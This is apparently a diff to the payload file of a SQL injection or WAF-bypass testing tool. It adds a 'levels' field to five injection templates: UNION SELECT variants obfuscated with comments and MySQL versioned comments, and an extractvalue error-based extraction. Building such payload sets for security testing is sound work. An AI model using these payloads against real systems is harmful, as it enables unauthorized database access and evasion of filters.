@@ -1,7 +1,7 @@
 [
-  {"id": "union",      "name": "UNION",        "template": "-1 UNION SELECT {TARGET}", "category": "baseline"},
-  {"id": "union_all",  "name": "UNION ALL",    "template": "-1 UNION ALL SELECT {TARGET}", "category": "semantic_bypass"},
-  {"id": "comment",    "name": "/**/UNION",    "template": "-1 UNION/**/SELECT {TARGET}", "category": "semantic_bypass"},
-  {"id": "mysql_cmt",  "name": "/*!UNION*/",   "template": "-1 /*!UNION*/ /*!SELECT*/ {TARGET}", "category": "semantic_bypass"},
-  {"id": "extractvalue","name": "extractvalue","template": "extractvalue(1,concat(0x7e,({TARGET}),0x7e))", "category": "baseline"}
+  {"id": "union",       "name": "UNION",         "template": "-1 UNION SELECT {TARGET}",             "levels": [1], "category": "baseline"},
+  {"id": "union_all",   "name": "UNION ALL",     "template": "-1 UNION ALL SELECT {TARGET}",         "levels": [1], "category": "semantic_bypass"},
+  {"id": "comment",     "name": "/**/UNION",     "template": "-1 UNION/**/SELECT {TARGET}",          "levels": [1], "category": "semantic_bypass"},
+  {"id": "mysql_cmt",   "name": "/*!UNION*/",    "template": "-1 /*!UNION*/ /*!SELECT*/ {TARGET}",   "levels": [1], "category": "semantic_bypass"},
+  {"id": "extractvalue","name": "extractvalue",  "template": "extractvalue(1,concat(0x7e,({TARGET}),0x7e))", "levels": [2], "category": "baseline"}
 ]
